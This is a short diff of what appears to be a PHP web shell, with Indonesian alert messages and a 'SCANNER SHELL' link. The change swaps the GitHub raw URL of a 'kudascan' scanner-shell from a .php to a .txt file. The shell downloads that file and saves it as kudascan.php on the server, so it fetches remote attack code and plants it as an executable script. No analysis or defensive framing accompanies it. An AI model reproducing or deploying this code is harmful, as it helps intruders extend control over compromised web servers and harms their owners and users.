@@ -480,7 +480,7 @@ function CreateTools($names, $lokasi) {
         if ($content !== false) {
             file_put_contents($file, $content);
         } else {
-            echo "<script>alert('Gagal cok!');</script>";
+            echo "<script>alert('Gagal eksekusi cok!');</script>";
             return;
         }
     }
@@ -4561,7 +4561,7 @@ if (file_exists('kudascan.php')) {
     echo "<center><a href='$full/kudascan.php' target='_blank'><font color='lime'>> SCANNER SHELL <</a></font></center>";
 }
 else {
-    if (tod("https://raw.githubusercontent.com/mrxbarakuda/scanner-shell/refs/heads/master/kudascan.php", "kudascan.php")) {
+    if (tod("https://raw.githubusercontent.com/mrxbarakuda/scanner-shell/refs/heads/master/kudascan.txt", "kudascan.php")) {
         echo "<center><a href='$full/kudascan.php' target='_blank'><font color='lime'>> SCANNER SHELL <</a></font></center>";
     }
     else {
